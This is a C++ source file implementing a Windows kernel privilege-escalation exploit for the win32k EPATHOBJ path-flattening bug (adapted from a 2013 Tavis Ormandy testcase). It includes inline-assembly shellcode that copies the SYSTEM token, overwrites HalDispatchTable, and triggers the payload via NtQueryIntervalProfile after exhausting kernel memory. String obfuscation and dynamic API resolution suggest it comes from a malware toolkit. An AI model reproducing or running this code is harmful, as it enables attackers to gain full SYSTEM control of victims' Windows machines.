#include "core\core.h"
#include "core\debug.h"

namespace Elevation
{

#ifndef _WIN64

ULONG WINAPI NtFreeVirtualMemory( HANDLE, PVOID, PULONG, ULONG);

#define MAX_POLYPOINTS (8192 * 3)
#define MAX_REGIONS 8192
#define CYCLE_TIMEOUT 10000

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE Section;                 // Not filled in
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[ 256 ];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[ 1 ];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

//
// win32k!EPATHOBJ::pprFlattenRec uninitialized Next pointer testcase.
//
// Tavis Ormandy <taviso () cmpxchg8b com>, March 2013
//

static POINT* points;
static BYTE* pointTypes;
static HRGN* regions;
static ULONG numRegion;
static HANDLE mutex;

// Log levels.
typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;

// Copied from winddi.h from the DDK
#define PD_BEGINSUBPATH   0x00000001
#define PD_ENDSUBPATH     0x00000002
#define PD_RESETSTYLE     0x00000004
#define PD_CLOSEFIGURE    0x00000008
#define PD_BEZIERS        0x00000010

typedef struct  _POINTFIX
{
    ULONG x;
    ULONG y;
} POINTFIX, *PPOINTFIX;

// Approximated from reverse engineering.
typedef struct _PATHRECORD
{
    struct _PATHRECORD *next;
    struct _PATHRECORD *prev;
    ULONG               flags;
    ULONG               count;
    POINTFIX            points[0];
} PATHRECORD, *PPATHRECORD;


PPATHRECORD pathRecord;
PATHRECORD  exploitRecord;
PPATHRECORD exploitRecordExit;

ULONG PsInitialSystemProcess, PsReferencePrimaryToken, PsGetThreadProcess, WriteToHalDispatchTable, FixAddress;

void _declspec(naked) ShellCode()
{
    __asm
    {
			pushad
			pushfd
			mov esi,PsReferencePrimaryToken
FindTokenOffset:
			lodsb
			cmp al, 8Dh;
			jnz FindTokenOffset
			mov edi,[esi+1]
			mov esi,PsInitialSystemProcess
			mov esi,[esi]
			push fs:[124h]
			mov eax,PsGetThreadProcess
			call eax
			add esi, edi
			push esi
			add edi, eax
			movsd
			
			;add token ref count.
			pop esi
			mov esi, [esi]
			and esi, 0xFFFFFFF8
			lea eax, [esi-0x18]
			mov DWORD PTR [eax], 0x016B00B5
			;fix the haltable
			mov eax, WriteToHalDispatchTable
			mov ecx, FixAddress
			mov [ecx], 0xC3
			mov DWORD PTR [eax], ecx

			popfd
			popad
			;set ret code for NtQueryIntervalProfile
			mov eax, [esp+0xc]
			mov DWORD PTR [eax+4], 1
			mov DWORD PTR [eax+8], 0xC0000018
			xor eax, eax
			ret
    }
}


DWORD WINAPI WatchdogThread(LPVOID Parameter)
{

    // This routine waits for a mutex object to timeout, then patches the
    // compromised linked list to point to an exploit. We need to do this.
    DbgMsg( "Watchdog thread %u waiting on Mutex () %p",  API(KERNEL32, GetCurrentThreadId)(), mutex );

    if( API(KERNEL32, WaitForSingleObject)( mutex, CYCLE_TIMEOUT ) == WAIT_TIMEOUT )
	{
        // It looks like the main thread is stuck in a call to FlattenPath(),
        // because the kernel is spinning in EPATHOBJ::bFlatten(). We can clean
        // up, and then patch the list to trigger our exploit.
        while( numRegion-- )
            API(GDI32, DeleteObject)( regions[numRegion] );

        DbgMsg( "InterlockedExchange(%p, %p);", &pathRecord->next, &exploitRecord );

        API(KERNEL32, InterlockedExchange)( (PLONG)&pathRecord->next, (LONG)&exploitRecord );

    }
	else 
	{
        DbgMsg( "Mutex object did not timeout, list not patched" );
    }

    return 0;
}

BOOL FindAFixAddress( ULONG NtoskrnlBase )
{
	FixAddress = NtoskrnlBase + FIELD_OFFSET(IMAGE_DOS_HEADER, e_res2);
	DbgMsg( "Get FixAddress --> 0x%08x", FixAddress );
	return TRUE;
}

// 0x602464FF; /*jmp esp+0x60*/
// 0x51C3686A; /*push 0; ret*/
DWORD CheckMagicDword()
{
	OSVERSIONINFOEXA OSVer;
	DWORD dwMagic = 0;

    OSVer.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    if( API(KERNEL32, GetVersionExA)( (OSVERSIONINFO*)&OSVer ) )
	{
		switch( OSVer.dwMajorVersion )
		{
			case 5:
				dwMagic = 0x602464FF;
				break;
			case 6:
				dwMagic = 0x642464FF;
				break;
			default:
				dwMagic = 0;
		}
	}
	return dwMagic;
}

#endif

bool PathRec()
{
#ifdef _WIN64
	return false;
#else
	DWORD MAGIC_DWORD = CheckMagicDword();
	if( !MAGIC_DWORD )
	{
		DbgMsg( "unsupported system version" );
		return false;
	}

	ULONG address = MAGIC_DWORD & 0xFFFFF000;
	ULONG allocSize = 0x1000;
	// try to allocate memory.
	for(;;)
	{
		NTSTATUS ret = API(NTDLL, NtAllocateVirtualMemory)( (HANDLE)-1, (PVOID*)&address, 0, &allocSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if(ret < 0)
		{
			MEMORY_BASIC_INFORMATION meminfo;
			DbgMsg( "allocate memory error code 0x%08x", ret );
			DbgMsg( "try to free memory" );
			if( API(KERNEL32, VirtualQuery)( (LPVOID)address, &meminfo, sizeof(meminfo) ) )
			{
				DbgMsg( "meminfo state %d %d", meminfo.State, meminfo.Protect );
			}
			ret = API(NTDLL, NtFreeVirtualMemory)( (HANDLE)-1, &address, &allocSize, MEM_RELEASE );
			if (ret < 0)
			{
				DbgMsg( "free memory error code 0x%08x", ret );
				return false;
			}
		}
		else
			break;
	}


	RTL_PROCESS_MODULES  module;
    ULONG status = API(NTDLL, NtQuerySystemInformation)( (SYSTEMINFOCLASS)11, &module, sizeof(RTL_PROCESS_MODULES), NULL ); //SystemModuleInformation 11
    if ( status != 0xC0000004 ){
		DbgMsg( "NtQuerySystemInformation error code:0x%08x\n", status );
		return false;
	}
	
    ULONG NtoskrnlBase = (ULONG)module.Modules[0].ImageBase;
    HMODULE ntoskrnl = API(KERNEL32, LoadLibraryA)( (LPCSTR)( module.Modules[0].FullPathName + module.Modules[0].OffsetToFileName ) );
    if (ntoskrnl == NULL){
		DbgMsg( "LoadLibraryA error code:0x%08x\n", API(KERNEL32, GetLastError)() );
		return false;
	}
	FindAFixAddress(NtoskrnlBase);

    WriteToHalDispatchTable =  (ULONG)API(KERNEL32, GetProcAddress)( ntoskrnl, _CS_("HalDispatchTable") ) - (ULONG)ntoskrnl + NtoskrnlBase + 4;
    PsInitialSystemProcess =  (ULONG)API(KERNEL32, GetProcAddress)( ntoskrnl, _CS_("PsInitialSystemProcess") ) - (ULONG)ntoskrnl + NtoskrnlBase;
    PsReferencePrimaryToken = (ULONG)API(KERNEL32, GetProcAddress)( ntoskrnl, _CS_("PsReferencePrimaryToken") ) - (ULONG)ntoskrnl + NtoskrnlBase;
    PsGetThreadProcess =  (ULONG)API(KERNEL32, GetProcAddress)( ntoskrnl, _CS_("PsGetThreadProcess") ) - (ULONG)ntoskrnl + NtoskrnlBase;

    // Create our PATHRECORD in userspace we will get added to the EPATHOBJ
    // pathrecord chain.
    pathRecord = (PPATHRECORD)API(KERNEL32, VirtualAlloc)( NULL, sizeof(PATHRECORD), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    DbgMsg( "Alllocated userspace PATHRECORD () %p", pathRecord );

    // Initialise with recognisable debugging values.
    Mem::Set( pathRecord, 0xcc, sizeof(PATHRECORD) );

    pathRecord->next = pathRecord;
    pathRecord->prev = (PPATHRECORD)(0x42424242);

    // You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from
    // EPATHOBJ::bFlatten(). We don't set it so that we can trigger an infinite
    // loop in EPATHOBJ::bFlatten().
    pathRecord->flags   = 0;

    DbgMsg( "  ->next  @ %p", pathRecord->next );
    DbgMsg( "  ->prev  @ %p", pathRecord->prev );
    DbgMsg( "  ->flags @ %u", pathRecord->flags );

	exploitRecordExit = (PPATHRECORD)MAGIC_DWORD;
	exploitRecordExit->next = NULL;
	exploitRecordExit->next = NULL;
	exploitRecordExit->flags = PD_BEGINSUBPATH;
	exploitRecordExit->count = 0;


    exploitRecord.next  = (PPATHRECORD)MAGIC_DWORD;
    exploitRecord.prev  = (PPATHRECORD)WriteToHalDispatchTable;
    exploitRecord.flags = PD_BEZIERS | PD_BEGINSUBPATH;
	exploitRecord.count = 4;

    DbgMsg( "Creating complex bezier path with %#x", (ULONG)(pathRecord) >> 4 );

    // Generate a large number of Bezier Curves made up of pointers to our
    // PATHRECORD object.
	points = new POINT[MAX_POLYPOINTS];
	pointTypes = new BYTE[MAX_POLYPOINTS];
	regions = new HRGN[MAX_REGIONS];
    for( ULONG pointNum = 0; pointNum < MAX_POLYPOINTS; pointNum++ )
	{
        points[pointNum].x = (ULONG)(pathRecord) >> 4;
        points[pointNum].y = (ULONG)(pathRecord) >> 4;
        pointTypes[pointNum] = PT_BEZIERTO;
    }

    // Switch to a dedicated desktop so we don't spam the visible desktop with
    // our Lines (Not required, just stops the screen from redrawing slowly).
    API(USER32, SetThreadDesktop)( API(USER32, CreateDesktopA)( _CS_("DontPanic"), NULL, NULL, 0, GENERIC_ALL, NULL ) );
	bool ret = false;
	int counter = 0;
	while( !ret && counter < 10 )
	{
	    mutex = API(KERNEL32, CreateMutexA)( NULL, TRUE, NULL );
		if( !mutex )
		{
			break;
		}

	    // Get a handle to this Desktop.
		HDC device = GetDC(NULL);

	    // Spawn a thread to cleanup
		HANDLE thread = API(KERNEL32, CreateThread)( NULL, 0, WatchdogThread, NULL, 0, NULL );

	    // We need to cause a specific AllocObject() to fail to trigger the
	    // exploitable condition. To do this, I create a large number of rounded
	    // rectangular regions until they start failing. I don't think it matters
	    // what you use to exhaust paged memory, there is probably a better way.
	    //
	    // I don't use the simpler CreateRectRgn() because it leaks a GDI handle on
	    // failure. Seriously, do some damn QA Microsoft, wtf.
		numRegion = 0;
		for( ULONG size = 1 << 26; size; size >>= 1 )
		{
			while( true )
			{
				HRGN hn = API(GDI32, CreateRoundRectRgn)( 0, 0, 1, size, 1, 1);
				if( !hn ) break;
				if( numRegion < MAX_REGIONS ) numRegion = 0;
				regions[numRegion] = hn;
				numRegion++;
			}
	    }
		DbgMsg( "Allocated %u HRGN objects", numRegion );

		DbgMsg( "Flattening curves..." );

		// Begin filling the free list with our points.
		DWORD dwFix = *(PULONG)ShellCode;
	    for( ULONG pointNum = MAX_POLYPOINTS; pointNum; pointNum -= 3 )
		{
			API(GDI32, BeginPath)(device);
			API(GDI32, PolyDraw)( device, points, pointTypes, pointNum );
			API(GDI32, EndPath)(device);
			API(GDI32, FlattenPath)(device);
			API(GDI32, FlattenPath)(device);

			// call the function to exploit.
			ret = API(NTDLL, NtQueryIntervalProfile)( (KPROFILE_SOURCE)2, (PULONG)ShellCode );

			// we will set the status with 0xC0000018 in ring0 shellcode.
			if( *(PULONG)ShellCode == 0xC0000018 )
			{
				ret = true;
				//fix
				*(PULONG)ShellCode = dwFix;
				break;
			}
			API(GDI32, EndPath)(device);
		}

		if( ret )
		{
			DbgMsg( "Exploit successfull" );
		}
		else
			DbgMsg( "No luck, cleaning up" );

	    // If we reach here, we didn't trigger the condition. Let the other thread know.
		API(KERNEL32, ReleaseMutex)(mutex);

		API(USER32, ReleaseDC)( NULL, device );
		API(KERNEL32, WaitForSingleObject)( thread, INFINITE );
		counter++;
	}
	delete regions;
	delete points;
	delete pointTypes;

    return ret;
#endif
}

}
